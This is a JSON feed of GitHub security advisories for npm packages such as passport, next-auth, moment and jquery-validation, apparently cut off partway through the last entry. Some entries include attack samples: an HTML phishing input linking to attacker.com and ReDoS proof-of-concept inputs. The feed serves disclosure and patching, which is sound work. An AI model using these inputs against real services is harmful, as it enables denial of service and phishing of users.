{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>This affects the package passport before 0.6.0. When a user logs in or logs out, the session is regenerated instead of being closed.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25896\">https://nvd.nist.gov/vuln/detail/CVE-2022-25896</a></li>\n<li><a href=\"https://github.com/jaredhanson/passport/pull/900\">https://github.com/jaredhanson/passport/pull/900</a></li>\n<li><a href=\"https://github.com/jaredhanson/passport/commit/7e9b9cf4d7be02428e963fc729496a45baeea608\">https://github.com/jaredhanson/passport/commit/7e9b9cf4d7be02428e963fc729496a45baeea608</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-PASSPORT-2840631\">https://snyk.io/vuln/SNYK-JS-PASSPORT-2840631</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v923-w3x8-wh69\">https://github.com/advisories/GHSA-v923-w3x8-wh69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v923-w3x8-wh69",
            "title": "[passport] Improper session management in passport",
            "date_modified": "2022-07-06T21:09:15.000Z",
            "date_published": "2022-07-02T00:00:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v923-w3x8-wh69"
            }
        },
        {
            "content_html": "<p>The package link-preview-js before 2.1.17 are vulnerable to Server-side Request Forgery (SSRF) which allows attackers to send arbitrary requests to the local network and read the response. This is due to flawed DNS rebinding protection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25876\">https://nvd.nist.gov/vuln/detail/CVE-2022-25876</a></li>\n<li><a href=\"https://github.com/ospfranco/link-preview-js/issues/115\">https://github.com/ospfranco/link-preview-js/issues/115</a></li>\n<li><a href=\"https://github.com/ospfranco/link-preview-js/pull/117\">https://github.com/ospfranco/link-preview-js/pull/117</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-LINKPREVIEWJS-2933520\">https://snyk.io/vuln/SNYK-JS-LINKPREVIEWJS-2933520</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h9cw-7g8j-h66h\">https://github.com/advisories/GHSA-h9cw-7g8j-h66h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h9cw-7g8j-h66h",
            "title": "[link-preview-js] Server-Side Request Forgery in link-preview-js",
            "date_modified": "2022-07-06T21:08:38.000Z",
            "date_published": "2022-07-02T00:00:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h9cw-7g8j-h66h"
            }
        },
        {
            "content_html": "<p>All versions of package scss-tokenizer are vulnerable to Regular Expression Denial of Service (ReDoS) via the loadAnnotation() function, due to the usage of insecure regex.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25758\">https://nvd.nist.gov/vuln/detail/CVE-2022-25758</a></li>\n<li><a href=\"https://github.com/sasstools/scss-tokenizer/issues/45\">https://github.com/sasstools/scss-tokenizer/issues/45</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2936782\">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2936782</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-SCSSTOKENIZER-2339884\">https://snyk.io/vuln/SNYK-JS-SCSSTOKENIZER-2339884</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mwh-4pqv-wmr8\">https://github.com/advisories/GHSA-7mwh-4pqv-wmr8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mwh-4pqv-wmr8",
            "title": "[scss-tokenizer] Regular expression denial of service in scss-tokenizer",
            "date_modified": "2022-07-06T21:07:15.000Z",
            "date_published": "2022-07-02T00:00:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mwh-4pqv-wmr8"
            }
        },
        {
            "content_html": "<p>swagger-ui has XSS in key names</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-1000229\">https://nvd.nist.gov/vuln/detail/CVE-2016-1000229</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2017:0868\">https://access.redhat.com/errata/RHSA-2017:0868</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000229\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000229</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h8wp-wgcq-qhrf\">https://github.com/advisories/GHSA-h8wp-wgcq-qhrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h8wp-wgcq-qhrf",
            "title": "[swagger-ui] Improper Neutralization of Input During Web Page Generation in swagger-ui",
            "date_modified": "2022-07-06T20:04:56.000Z",
            "date_published": "2022-05-24T17:04:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h8wp-wgcq-qhrf"
            }
        },
        {
            "content_html": "<p>In Select2 through 4.0.5, as used in Snipe-IT and other products, rich selectlists allow XSS. This affects use cases with Ajax remote data loading when HTML templates are used to display listbox data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-10744\">https://nvd.nist.gov/vuln/detail/CVE-2016-10744</a></li>\n<li><a href=\"https://github.com/select2/select2/issues/4587\">https://github.com/select2/select2/issues/4587</a></li>\n<li><a href=\"https://github.com/snipe/snipe-it/pull/6831\">https://github.com/snipe/snipe-it/pull/6831</a></li>\n<li><a href=\"https://github.com/snipe/snipe-it/pull/6831/commits/5848d9a10c7d62c73ff6a3858edfae96a429402a\">https://github.com/snipe/snipe-it/pull/6831/commits/5848d9a10c7d62c73ff6a3858edfae96a429402a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf66-hmqf-q3fc\">https://github.com/advisories/GHSA-rf66-hmqf-q3fc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf66-hmqf-q3fc",
            "title": "[select2] Improper Neutralization of Input During Web Page Generation in Select2",
            "date_modified": "2022-07-06T20:04:29.000Z",
            "date_published": "2022-05-14T01:14:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf66-hmqf-q3fc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Parse Server LiveQuery does not remove protected fields in classes, passing them to the client.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The LiveQueryController now removes protected fields from the client response.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use <code>Parse.Cloud.afterLiveQueryEvent</code> to manually remove protected fields.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\">https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server\">https://github.com/parse-community/parse-server</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>For questions or comments about this vulnerability visit our <a href=\"http://community.parseplatform.org/\">community forum</a> or <a href=\"http://chat.parseplatform.org/\">community chat</a></li>\n<li>Report other vulnerabilities at <a href=\"https://report.parseplatform.org/\">report.parseplatform.org</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\">https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31112\">https://nvd.nist.gov/vuln/detail/CVE-2022-31112</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/issues/8073\">https://github.com/parse-community/parse-server/issues/8073</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/8074\">https://github.com/parse-community/parse-server/pull/8074</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/309f64ced8700321df056fb3cc97f15007a00df1\">https://github.com/parse-community/parse-server/commit/309f64ced8700321df056fb3cc97f15007a00df1</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/9fd4516cde5c742f9f29dd05468b4a43a85639a6\">https://github.com/parse-community/parse-server/commit/9fd4516cde5c742f9f29dd05468b4a43a85639a6</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/5.2.4\">https://github.com/parse-community/parse-server/releases/tag/5.2.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-crrq-vr9j-fxxh\">https://github.com/advisories/GHSA-crrq-vr9j-fxxh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-crrq-vr9j-fxxh",
            "title": "[parse-server] Protected fields exposed via LiveQuery",
            "date_modified": "2022-07-06T19:52:24.000Z",
            "date_published": "2022-07-06T19:52:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-crrq-vr9j-fxxh"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Parse Server LiveQuery does not remove protected fields in classes, passing them to the client.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The LiveQueryController now removes protected fields from the client response.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use <code>Parse.Cloud.afterLiveQueryEvent</code> to manually remove protected fields.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\">https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server\">https://github.com/parse-community/parse-server</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>For questions or comments about this vulnerability visit our <a href=\"http://community.parseplatform.org/\">community forum</a> or <a href=\"http://chat.parseplatform.org/\">community chat</a></li>\n<li>Report other vulnerabilities at <a href=\"https://report.parseplatform.org/\">report.parseplatform.org</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\">https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31112\">https://nvd.nist.gov/vuln/detail/CVE-2022-31112</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/issues/8073\">https://github.com/parse-community/parse-server/issues/8073</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/8074\">https://github.com/parse-community/parse-server/pull/8074</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/309f64ced8700321df056fb3cc97f15007a00df1\">https://github.com/parse-community/parse-server/commit/309f64ced8700321df056fb3cc97f15007a00df1</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/9fd4516cde5c742f9f29dd05468b4a43a85639a6\">https://github.com/parse-community/parse-server/commit/9fd4516cde5c742f9f29dd05468b4a43a85639a6</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/5.2.4\">https://github.com/parse-community/parse-server/releases/tag/5.2.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-crrq-vr9j-fxxh\">https://github.com/advisories/GHSA-crrq-vr9j-fxxh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-crrq-vr9j-fxxh",
            "title": "[parse-server] Protected fields exposed via LiveQuery",
            "date_modified": "2022-07-06T19:52:24.000Z",
            "date_published": "2022-07-06T19:52:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-crrq-vr9j-fxxh"
            }
        },
        {
            "content_html": "<p>deep.assign npm package 0.0.0-alpha.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-40663\">https://nvd.nist.gov/vuln/detail/CVE-2021-40663</a></li>\n<li><a href=\"https://github.com/janbialostok/deep-assign/issues/1\">https://github.com/janbialostok/deep-assign/issues/1</a></li>\n<li><a href=\"https://www.npmjs.com/package/deep.assign\">https://www.npmjs.com/package/deep.assign</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3829-mgmw-jcg4\">https://github.com/advisories/GHSA-3829-mgmw-jcg4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3829-mgmw-jcg4",
            "title": "[deep.assign] Prototype Pollution in deep.assign",
            "date_modified": "2022-07-11T19:25:09.000Z",
            "date_published": "2022-07-01T00:01:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3829-mgmw-jcg4"
            }
        },
        {
            "content_html": "<p>All versions of package git-clone are vulnerable to Command Injection due to insecure usage of the --upload-pack feature of git.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25900\">https://nvd.nist.gov/vuln/detail/CVE-2022-25900</a></li>\n<li><a href=\"https://gist.github.com/lirantal/9441f3a1212728476f7a6caa4acb2ccc\">https://gist.github.com/lirantal/9441f3a1212728476f7a6caa4acb2ccc</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-GITCLONE-2434308\">https://snyk.io/vuln/SNYK-JS-GITCLONE-2434308</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8jmw-wjr8-2x66\">https://github.com/advisories/GHSA-8jmw-wjr8-2x66</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8jmw-wjr8-2x66",
            "title": "[git-clone] Command injection in git-clone",
            "date_modified": "2022-07-06T19:51:37.000Z",
            "date_published": "2022-07-02T00:00:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8jmw-wjr8-2x66"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can pass a compromised input to the e-mail <a href=\"https://next-auth.js.org/getting-started/rest-api#post-apiauthsigninprovider\">signin endpoint</a> that contains some malicious HTML, tricking the e-mail server to send it to the user, so they can perform a phishing attack. Eg.: <code>balazs@email.com, &lt;a href=\"http://attacker.com\"&gt;Before signing in, claim your money!&lt;/a&gt;</code>. This was previously sent to <code>balazs@email.com</code>, and the content of the email containing a link to the attacker's site was rendered in the HTML. This has been remedied in the following releases, by simply not rendering that e-mail in the HTML, since it should be obvious to the receiver what e-mail they used:</p>\n<p>next-auth v3 users before version 3.29.8 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our <a href=\"https://next-auth.js.org/getting-started/upgrade-v4\">migration guide</a>)</p>\n<p>next-auth v4 users before version 4.8.0 are impacted.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We've released patches for this vulnerability in:</p>\n<ul>\n<li>v3 - <code>3.29.8</code></li>\n<li>v4 - <code>4.9.0</code></li>\n</ul>\n<p>You can do:</p>\n<pre><code class=\"language-sh\">npm i next-auth@latest\n# or\nyarn add next-auth@latest\n#\npnpm add next-auth@latest\n</code></pre>\n<p>(This will update to the latest v4 version, but you can change  <code>latest</code> to <code>3</code> if you want to stay on v3. This is not recommended.)</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If for some reason you cannot upgrade, the workaround requires you to sanitize the <code>email</code> parameter that is passed to <code>sendVerificationRequest</code> and rendered in the HTML. If you haven't created a custom <code>sendVerificationRequest</code>, you only need to upgrade. Otherwise, make sure to either exclude <code>email</code> from the HTML body or efficiently sanitize it. Check out <a href=\"https://next-auth.js.org/providers/email#customizing-emails\">https://next-auth.js.org/providers/email#customizing-emails</a></p>\n<h3 id=\"references\">References</h3>\n<p>Related documentation:</p>\n<ul>\n<li><a href=\"https://next-auth.js.org/providers/email#customizing-emails\">https://next-auth.js.org/providers/email#customizing-emails</a></li>\n<li><a href=\"https://next-auth.js.org/getting-started/upgrade-v4\">https://next-auth.js.org/getting-started/upgrade-v4</a></li>\n</ul>\n<p>A test case has been added so this kind of issue will be checked before publishing. See: <a href=\"https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts\">https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any concerns, we request responsible disclosure, outlined here: <a href=\"https://next-auth.js.org/security#reporting-a-vulnerability\">https://next-auth.js.org/security#reporting-a-vulnerability</a></p>\n<h3 id=\"timeline\">Timeline</h3>\n<p>The issue was reported 2022 June 29th, a response was sent out to the reporter in less than 1 hour, and after identifying the issue a patch was published within 4 working days.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nextauthjs/next-auth/security/advisories/GHSA-pgjx-7f9g-9463\">https://github.com/nextauthjs/next-auth/security/advisories/GHSA-pgjx-7f9g-9463</a></li>\n<li><a href=\"https://github.com/nextauthjs/next-auth/commit/ae834f1e08a4a9915665eecb9479c74c6b039c9c\">https://github.com/nextauthjs/next-auth/commit/ae834f1e08a4a9915665eecb9479c74c6b039c9c</a></li>\n<li><a href=\"https://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.9.0\">https://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.9.0</a></li>\n<li><a href=\"https://next-auth.js.org/getting-started/upgrade-v4\">https://next-auth.js.org/getting-started/upgrade-v4</a></li>\n<li><a href=\"https://next-auth.js.org/providers/email#customizing-emails\">https://next-auth.js.org/providers/email#customizing-emails</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31127\">https://nvd.nist.gov/vuln/detail/CVE-2022-31127</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pgjx-7f9g-9463\">https://github.com/advisories/GHSA-pgjx-7f9g-9463</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pgjx-7f9g-9463",
            "title": "[next-auth] Improper handling of email input",
            "date_modified": "2022-07-07T17:15:03.000Z",
            "date_published": "2022-07-06T19:27:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pgjx-7f9g-9463"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can pass a compromised input to the e-mail <a href=\"https://next-auth.js.org/getting-started/rest-api#post-apiauthsigninprovider\">signin endpoint</a> that contains some malicious HTML, tricking the e-mail server to send it to the user, so they can perform a phishing attack. Eg.: <code>balazs@email.com, &lt;a href=\"http://attacker.com\"&gt;Before signing in, claim your money!&lt;/a&gt;</code>. This was previously sent to <code>balazs@email.com</code>, and the content of the email containing a link to the attacker's site was rendered in the HTML. This has been remedied in the following releases, by simply not rendering that e-mail in the HTML, since it should be obvious to the receiver what e-mail they used:</p>\n<p>next-auth v3 users before version 3.29.8 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our <a href=\"https://next-auth.js.org/getting-started/upgrade-v4\">migration guide</a>)</p>\n<p>next-auth v4 users before version 4.8.0 are impacted.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We've released patches for this vulnerability in:</p>\n<ul>\n<li>v3 - <code>3.29.8</code></li>\n<li>v4 - <code>4.9.0</code></li>\n</ul>\n<p>You can do:</p>\n<pre><code class=\"language-sh\">npm i next-auth@latest\n# or\nyarn add next-auth@latest\n#\npnpm add next-auth@latest\n</code></pre>\n<p>(This will update to the latest v4 version, but you can change  <code>latest</code> to <code>3</code> if you want to stay on v3. This is not recommended.)</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If for some reason you cannot upgrade, the workaround requires you to sanitize the <code>email</code> parameter that is passed to <code>sendVerificationRequest</code> and rendered in the HTML. If you haven't created a custom <code>sendVerificationRequest</code>, you only need to upgrade. Otherwise, make sure to either exclude <code>email</code> from the HTML body or efficiently sanitize it. Check out <a href=\"https://next-auth.js.org/providers/email#customizing-emails\">https://next-auth.js.org/providers/email#customizing-emails</a></p>\n<h3 id=\"references\">References</h3>\n<p>Related documentation:</p>\n<ul>\n<li><a href=\"https://next-auth.js.org/providers/email#customizing-emails\">https://next-auth.js.org/providers/email#customizing-emails</a></li>\n<li><a href=\"https://next-auth.js.org/getting-started/upgrade-v4\">https://next-auth.js.org/getting-started/upgrade-v4</a></li>\n</ul>\n<p>A test case has been added so this kind of issue will be checked before publishing. See: <a href=\"https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts\">https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any concerns, we request responsible disclosure, outlined here: <a href=\"https://next-auth.js.org/security#reporting-a-vulnerability\">https://next-auth.js.org/security#reporting-a-vulnerability</a></p>\n<h3 id=\"timeline\">Timeline</h3>\n<p>The issue was reported 2022 June 29th, a response was sent out to the reporter in less than 1 hour, and after identifying the issue a patch was published within 4 working days.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nextauthjs/next-auth/security/advisories/GHSA-pgjx-7f9g-9463\">https://github.com/nextauthjs/next-auth/security/advisories/GHSA-pgjx-7f9g-9463</a></li>\n<li><a href=\"https://github.com/nextauthjs/next-auth/commit/ae834f1e08a4a9915665eecb9479c74c6b039c9c\">https://github.com/nextauthjs/next-auth/commit/ae834f1e08a4a9915665eecb9479c74c6b039c9c</a></li>\n<li><a href=\"https://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.9.0\">https://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.9.0</a></li>\n<li><a href=\"https://next-auth.js.org/getting-started/upgrade-v4\">https://next-auth.js.org/getting-started/upgrade-v4</a></li>\n<li><a href=\"https://next-auth.js.org/providers/email#customizing-emails\">https://next-auth.js.org/providers/email#customizing-emails</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31127\">https://nvd.nist.gov/vuln/detail/CVE-2022-31127</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pgjx-7f9g-9463\">https://github.com/advisories/GHSA-pgjx-7f9g-9463</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pgjx-7f9g-9463",
            "title": "[next-auth] Improper handling of email input",
            "date_modified": "2022-07-07T17:15:03.000Z",
            "date_published": "2022-07-06T19:27:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pgjx-7f9g-9463"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs</li>\n<li>noticeable slowdown is observed with inputs above 10k characters</li>\n<li>users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>In general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.</p>\n<h3 id=\"references\">References</h3>\n<p>There is an excellent writeup of the issue here: <a href=\"https://github.com/moment/moment/pull/6015#issuecomment-1152961973=\">https://github.com/moment/moment/pull/6015#issuecomment-1152961973=</a></p>\n<h3 id=\"details\">Details</h3>\n<p>The issue is rooted in the code that removes legacy comments (stuff inside parenthesis) from strings during rfc2822 parsing. <code>moment(\"(\".repeat(500000))</code> will take a few minutes to process, which is unacceptable.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\">https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g</a></li>\n<li><a href=\"https://github.com/moment/moment/pull/6015#issuecomment-1152961973\">https://github.com/moment/moment/pull/6015#issuecomment-1152961973</a></li>\n<li><a href=\"https://github.com/moment/moment/commit/9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3\">https://github.com/moment/moment/commit/9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31129\">https://nvd.nist.gov/vuln/detail/CVE-2022-31129</a></li>\n<li><a href=\"https://huntr.dev/bounties/f0952b67-f2ff-44a9-a9cd-99e0a87cb633/\">https://huntr.dev/bounties/f0952b67-f2ff-44a9-a9cd-99e0a87cb633/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wc69-rhjr-hc9g\">https://github.com/advisories/GHSA-wc69-rhjr-hc9g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wc69-rhjr-hc9g",
            "title": "[moment] Inefficient Regular Expression Complexity in moment",
            "date_modified": "2022-07-11T19:26:42.000Z",
            "date_published": "2022-07-06T18:38:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wc69-rhjr-hc9g"
            }
        },
        {
            "content_html": "<p><strong>Summary</strong></p>\n<p>The issue is the same as CVE-2021-43306: An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the jquery-validation npm package, when an attacker is able to supply arbitrary input to the url2 method</p>\n<p>The fix for CVE-2021-43306, which was suggested by me (<a href=\"https://github.com/erik-krogh\">@erik-krogh</a>), was incomplete. I didn't know at the time that the fix was incomplete, but the ReDoS analysis in CodeQL has improved since then.</p>\n<p><strong>Details</strong>\nIssue: ReDoS in url2.js (GHSL-2022-039)</p>\n<p>Below is a PoC that contains the relevant regular expression. Run following script with node and you will notice that it doesn't terminate.</p>\n<pre><code class=\"language-js\">const reg = /^(?:(?:(?:https?|ftp):)?\\/\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z0-9\\u00a1-\\uffff][a-z0-9\\u00a1-\\uffff_-]{0,62})?[a-z0-9\\u00a1-\\uffff]\\.?)+(?:[a-z\\u00a1-\\uffff]{2,}\\.?))(?::\\d{2,5})?(?:[/?#]\\S*)?$/i;\n\nconst str = \"//\" + \"00\".repeat(50)\n\nconsole.log(reg.test(str));\n...\n</code></pre>\n<p>The bad fix was identified using CodeQL, and the alert is visible on LGTM.com: <a href=\"https://lgtm.com/projects/g/jquery-validation/jquery-validation/snapshot/fec195de32da23c813b08a6a786a7f1cb6567069/files/src/additional/url2.js?sort=name&amp;dir=ASC&amp;mode=heatmap#x9013eb6c276f2ced:1\">https://lgtm.com/projects/g/jquery-validation/jquery-validation/snapshot/fec195de32da23c813b08a6a786a7f1cb6567069/files/src/additional/url2.js?sort=name&amp;dir=ASC&amp;mode=heatmap#x9013eb6c276f2ced:1</a>\nImpact</p>\n<p>This issue may lead to DoS.\nRemediation</p>\n<p>The new vulnerability has since been fixed in the gist that the regular expression was copy-pasted from: <a href=\"https://gist.github.com/dperini/729294#file-regex-weburl-js-L62\">https://gist.github.com/dperini/729294#file-regex-weburl-js-L62</a> So the fix is just to copy-paste that new version (copy pasted below).</p>\n<pre><code class=\"language-js\">/^(?:(?:(?:https?|ftp):)?\\/\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z0-9\\u00a1-\\uffff][a-z0-9\\u00a1-\\uffff_-]{0,62})?[a-z0-9\\u00a1-\\uffff]\\.)+(?:[a-z\\u00a1-\\uffff]{2,}\\.?))(?::\\d{2,5})?(?:[/?#]\\S*)?$/i\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jquery-validation/jquery-validation/security/advisories/GHSA-ffmh-x56j-9rc3\">https://github.com/jquery-validation/jquery-validation/security/advisories/GHSA-ffmh-x56j-9rc3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ffmh-x56j-9rc3\">https://github.com/advisories/GHSA-ffmh-x56j-9rc3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ffmh-x56j-9rc3",
            "title": "[jquery-validation] Regular Expression Denial of Service in jquery-validation",
